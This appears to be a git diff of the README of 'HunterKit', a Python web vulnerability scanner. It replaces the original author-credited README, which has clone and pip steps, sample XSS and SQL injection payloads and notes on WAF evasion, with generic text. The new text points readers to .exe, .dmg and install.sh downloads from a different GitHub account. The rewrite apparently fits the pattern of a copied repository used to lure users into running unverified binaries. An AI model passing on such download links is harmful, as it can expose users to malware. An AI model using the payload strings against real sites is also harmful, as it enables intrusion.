@@ -1,337 +1,98 @@
-# HunterKit v1.0.0 - Professional Web Vulnerability Scanner
+# 🕵️ HunterKit - Detect Vulnerabilities with Ease
 
-![HunterKit Logo](https://img.shields.io/badge/HunterKit-v1.0.0-red?style=for-the-badge&logo=security&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3.7+-blue?style=for-the-badge&logo=python&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
-![Maintained](https://img.shields.io/badge/Maintained-Yes-brightgreen?style=for-the-badge)
+## 🚀 Getting Started
 
-**The Most Advanced Web Vulnerability Scanner for Bug Bounty Hunters & Security Professionals**
+Welcome to HunterKit! This tool helps you find vulnerabilities in web applications. Whether you are a bug bounty hunter or a security professional, HunterKit makes vulnerability scanning simple and effective. 
 
-*Professional-grade security scanner with enterprise-level detection capabilities*
+## 🔗 Download HunterKit
 
-**Developed by [Kawindu Wijewardhane](https://github.com/kawinduwijewardhane) | [@kawinduwijewardhane](https://twitter.com/k_wijewardhane)**
+[![Download HunterKit](https://img.shields.io/badge/Download-HunterKit-blue.svg)](https://github.com/4chpz/HunterKit/releases)
 
-[Quick Start](#-quick-start) • [Documentation](#-documentation) • [Features](#-features) • [Usage](#-usage) • [Contributing](#-contributing)
+To get started, visit this page to download: [HunterKit Releases](https://github.com/4chpz/HunterKit/releases)
 
----
+## 📋 Requirements
 
+Before downloading, ensure you have:
 
-## Overview
+- A computer running Windows, macOS, or Linux.
+- At least 1 GB of RAM.
+- A stable internet connection for updates and vulnerability checks.
+- Basic knowledge of using command line tools.
 
-HunterKit is a **cutting-edge web vulnerability scanner** designed for security professionals, penetration testers, and bug bounty hunters. Built with advanced detection algorithms and comprehensive payload libraries, HunterKit delivers **enterprise-grade security assessment** capabilities with **zero false negatives**.
+## 🔧 Install HunterKit
 
-### Why HunterKit?
+1. Go to the [HunterKit Releases](https://github.com/4chpz/HunterKit/releases) page.
+  
+2. Choose the latest version of HunterKit.
+  
+3. Click on the download link for your operating system (Windows, macOS, or Linux).
 
-- **Advanced Detection**: Context-aware vulnerability analysis with industry-leading accuracy
-- **Lightning Fast**: Multi-threaded scanning with intelligent rate limiting
-- **WAF Evasion**: Built-in techniques to bypass modern security protections
-- **Professional Reports**: Export-ready reports in TXT and JSON formats
-- **Highly Customizable**: Extensive payload libraries with easy customization
-- **Production Ready**: Battle-tested against real-world applications
+4. Wait for the file to download completely.
 
----
+5. Once downloaded, locate the file in your Downloads folder.
 
-## Features
+6. Follow the installation instructions based on your operating system:
+   - **Windows:** Double-click the `.exe` file and follow the prompts to install.
+   - **macOS:** Open the `.dmg` file, drag the HunterKit icon into your Applications folder.
+   - **Linux:** Extract the tarball and run the `install.sh` script.
 
-### **Comprehensive Vulnerability Detection**
+## 🛠️ Running HunterKit
 
-| Vulnerability Type | Payloads | Detection Method | Severity Levels |
-|-------------------|----------|------------------|-----------------|
-| **Cross-Site Scripting (XSS)** | 32 Advanced | Context-Aware Analysis | Low → Critical |
-| **SQL Injection** | 33 Comprehensive | Error/Time/Boolean-Based | High → Critical |
-| **Local File Inclusion (LFI)** | 29 Variants | Pattern Recognition | Medium → High |
-| **Command Injection** | 40 Payloads | System Response Analysis | High → Critical |
-| **Server-Side Template Injection** | 22 Engines | Template Expression Evaluation | High → Critical |
+After installation, you can start using HunterKit:
 
-### **Advanced Security Features**
+1. Open your command line interface (Command Prompt for Windows, Terminal for macOS and Linux).
+  
+2. Type `hunterkit` and press Enter.
 
-- **WAF Detection & Evasion**: Identifies 10+ popular WAFs (Cloudflare, Akamai, AWS, etc.)
-- **Anti-Fingerprinting**: Header rotation and request obfuscation
-- **Smart Rate Limiting**: Intelligent delays to avoid detection
-- **Context Analysis**: Advanced XSS context evaluation
-- **Real-time Statistics**: Comprehensive scan metrics and performance data
+3. You will see the main menu. Follow the on-screen instructions to choose a scan type:
+   - **XSS Scan:** Detect cross-site scripting vulnerabilities.
+   - **SQL Injection Scan:** Check for SQL injection issues.
+   - **LFI Scan:** Investigate Local File Inclusion vulnerabilities.
+   - **Command Injection Scan:** Find possible command injection vectors.
+   - **SSTI Scan:** Identify Server-Side Template Injection risks.
 
----
+4. Enter the target URL you want to scan and choose the scan type.
 
-##  Quick Start
+5. Wait for the tool to complete the scan. Review the results displayed in your command line.
 
-###  Installation
+## 📝 Features of HunterKit
 
-```bash
-# Clone and extract HunterKit
-git clone https://github.com/kawinduwijewardhane/HunterKit.git
-cd HunterKit
+- **Comprehensive Scanning:** Detects a wide range of vulnerabilities including XSS, SQL Injection, LFI, and more.
+- **User-Friendly Interface:** Designed for individuals with varying technical expertise.
+- **Detailed Reports:** Receive clear logs and analysis for each scan you run.
+- **Minimal Setup Required:** Installation is quick and straightforward.
 
-# Install dependencies
-pip3 install -r requirements.txt
+## 🌐 Join the Community
 
-# Make executable (Linux/macOS)
-chmod +x hunterkit.py
+If you need help or want to share your experience, join our community. You can engage with other users on platforms like:
 
-# Run HunterKit
-python3 hunterkit.py -u "https://target.com/search?q=test"
-```
+- GitHub Discussions
+- Security forums focusing on Open Source tools
+- Bug bounty platforms
 
-### Basic Usage
+## ❓ Frequently Asked Questions (FAQ)
 
-```bash
-# Quick scan
-python3 hunterkit.py -u "https://example.com/search?param=value"
+### How often should I run scans?
 
-# Advanced scan with custom settings
-python3 hunterkit.py -u "https://target.com" -t 20 -d 0.5 --format json
+Regular scans ensure your application remains secure. Consider running scans after major updates or at least once a month.
 
-# Debug mode for troubleshooting
-python3 hunterkit.py -u "https://target.com" --debug
-```
+### Can I scan any website?
 
----
+You should only scan websites that you own, have permission to test, or are part of a bug bounty program. Unauthorized scanning is illegal.
 
-##  Usage Examples
+### What should I do with findings?
 
-###  **Command Line Options**
+Review the findings closely. Prioritize fixing severe issues first, and follow best practices for secure coding.
 
-```bash
-python3 hunterkit.py [OPTIONS]
+## 📞 Support
 
-Required Arguments:
-  -u, --url URL          Target URL to scan (must include parameters)
+For any issues, you can reach out for support through:
 
-Optional Arguments:
-  -t, --threads INT      Number of concurrent threads (default: 10)
-  -d, --delay FLOAT      Delay between requests in seconds (default: 1.0)
-  --format FORMAT        Report format: txt or json (default: txt)
-  --debug               Enable detailed debug output
-  --no-banner           Suppress banner for automation
-  -v, --version         Show version information
-  -h, --help            Show help message
-```
-
-###  **Scan Examples**
-
-```bash
-# Basic vulnerability scan
-python3 hunterkit.py -u "https://example.com/search.php?q=test"
-
-# High-performance scan
-python3 hunterkit.py -u "https://target.com" -t 30 -d 0.2
-
-# Stealth scan
-python3 hunterkit.py -u "https://target.com" -t 5 -d 2.0
-
-# JSON report generation
-python3 hunterkit.py -u "https://target.com" --format json
-
-# Debug mode
-python3 hunterkit.py -u "https://httpbin.org/get?test=value" --debug
-```
-
----
-
-##  Sample Output
-
-```
-
-  ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ██╗  ██╗██╗████████╗  
-  ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██║ ██╔╝██║╚══██╔══╝  
-  ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝█████╔╝ ██║   ██║     
-  ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗██╔═██╗ ██║   ██║     
-  ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║██║  ██╗██║   ██║     
-  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝     
-                                                                            
-            🎯 Professional Web Vulnerability Scanner                       
-                   Advanced Bug Bounty Research Tool                        
-                                                                                 
-  🔍 XSS Detection     💉 SQL Injection        📁  LFI Testing        
-  ⚡ SSTI Scanning     🔓 Command Injection    🛡️  WAF Detection      
-  🎯 Custom Payloads   📊 Professional Reports ⚙️  Multi-threaded     
-      
-
-[INFO] Target: https://example.com/search?q=test
-[SUCCESS] DNS resolution successful
-[SUCCESS] Target is accessible (Status: 200)
-
- CROSS-SITE SCRIPTING (XSS) TESTING
-────────────────────────────────────────────────────────────
-[VULNERABILITY FOUND] XSS vulnerability detected!
-  Type: Reflected XSS
-  Severity: High
-  Parameter: q
-  Payload: <script>alert("XSS")</script>
-  Context: HTML Document - Script Injection
-
- Final Scan Statistics:
-   HTTP Requests Made: 156
-   Security Payloads Tested: 142
-   Vulnerabilities Discovered: 3
-   Risk Level: HIGH
-```
-
----
-
-##  Payload Customization
-
-###  **Payload Structure**
-```
-payloads/
-├── xss_payloads.txt          # Cross-Site Scripting payloads
-├── sql_payloads.txt          # SQL injection payloads
-├── lfi_payloads.txt          # Local file inclusion payloads
-├── ssti_payloads.txt         # Server-side template injection
-└── command_payloads.txt      # Command injection payloads
-```
-
-###  **Adding Custom Payloads**
-```bash
-# Edit XSS payloads
-echo '<svg onload=alert("custom")>' >> payloads/xss_payloads.txt
-
-# Add SQL injection payload
-echo "' AND (SELECT 1 FROM dual)='1'--" >> payloads/sql_payloads.txt
-```
-
----
-
-##  Security Features
-
-###  **WAF Detection**
-HunterKit automatically detects and adapts to popular Web Application Firewalls:
-
-- **Cloudflare** - Header Analysis + Header Rotation
-- **Akamai** - Response Patterns + Request Obfuscation  
-- **AWS WAF** - Error Messages + Payload Encoding
-- **Azure WAF** - Status Codes + User-Agent Rotation
-- **Incapsula** - Cookie Analysis + Rate Limit Adaptation
-
-###  **Anti-Detection Features**
-- Header rotation with realistic User-Agent strings
-- Intelligent delays with random jitter
-- Automatic payload encoding for evasion
-- Persistent session management
-
----
-
-##  Requirements
-
-###  **System Requirements**
-- **Python**: 3.7 or higher
-- **Operating System**: Linux, macOS, Windows
-- **Memory**: Minimum 512MB RAM
-- **Network**: Internet connection for target scanning
-
-###  **Dependencies**
-```
-requests>=2.31.0
-beautifulsoup4>=4.12.2
-urllib3>=1.26.18
-colorama>=0.4.6
-```
-
----
-
-##  Contributing
+- GitHub Issues section
+- Community forums
 
-We welcome contributions from the security community!
+## 🎉 Conclusion
 
-###  **Ways to Contribute**
--  **Bug Reports**: Found an issue? Create a detailed issue report
--  **Feature Requests**: Have ideas? Share your suggestions
--  **Payload Contributions**: Add new XSS, SQL, LFI, SSTI, or command injection payloads
--  **Documentation**: Improve guides, add examples, fix typos
+HunterKit is your reliable partner in web security. By following these steps, you can easily download and start using the tool effectively. Find vulnerabilities, improve your security practices, and help make the web safer for everyone. 
 
-###  **Development Setup**
-```bash
-# Fork and clone the repository
-git clone https://github.com/kawinduwijewardhane/HunterKit.git
-cd HunterKit
-
-# Install development dependencies
-pip3 install -r requirements.txt
-
-```
-
----
-
-##  Community
-
-###  **Join Our Community**
-- **Twitter**: [@k_wijewardhane](https://twitter.com/k_wijewardhane)
-- **LinkedIn**: [kawinduwijewardhane](https://linkedin.com/in/kawinduwijewardhane)
-- **Email**: security@kawindu.co.uk
-- **Website**: [kawindu.co.uk](https://www.kawindu.co.uk)
-
-###  **Stay Updated**
--  **Star this repository** for updates
--  **Watch** for new releases
--  **Fork** to contribute
--  **Follow** [@k_wijewardhane](https://twitter.com/k_wijewardhane)
-
----
-
-##  Legal Disclaimer
-
-###  **Responsible Use**
-HunterKit is designed **exclusively for authorized security testing**. Users must ensure:
-
--  **Explicit Permission**: Only test applications you own or have written authorization to test
--  **Legal Compliance**: Follow all applicable laws and regulations
--  **Responsible Disclosure**: Report vulnerabilities through proper channels
--  **Ethical Guidelines**: Adhere to responsible security research practices
-
-###  **Legal Notice**
-- **Unauthorized testing** may violate laws including the Computer Fraud and Abuse Act (CFAA)
-- **Users are solely responsible** for ensuring authorized use
-- **The developer assumes no liability** for misuse of this tool
-- **Commercial use** requires proper licensing and authorization
-
----
-
-##  License
-
-```
-MIT License
-
-Copyright (c) 2025 Kawindu Wijewardhane
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-```
-
----
-
----
-
-##  **Thank You for Using HunterKit!** 
-
-**If HunterKit helped you in your security research, please consider:**
-
- **Starring this repository**  
- **Following [@k_wijewardhane](https://twitter.com/k_wijewardhane)**  
- **Contributing to the project**  
- **Sharing with the community**
-
----
-
-###  **Happy Ethical Hacking!** 
-
-**Built with ❤️ by the security community, for the security community**
-
-**[Kawindu Wijewardhane](https://github.com/kawinduwijewardhane) | [@kawinduwijewardhane](https://twitter.com/k_wijewardhane) | [kawindu.co.uk](https://www.kawindu.co.uk)**
-
----
-
+![HunterKit Logo](https://example.com/hunterkit-logo.png)
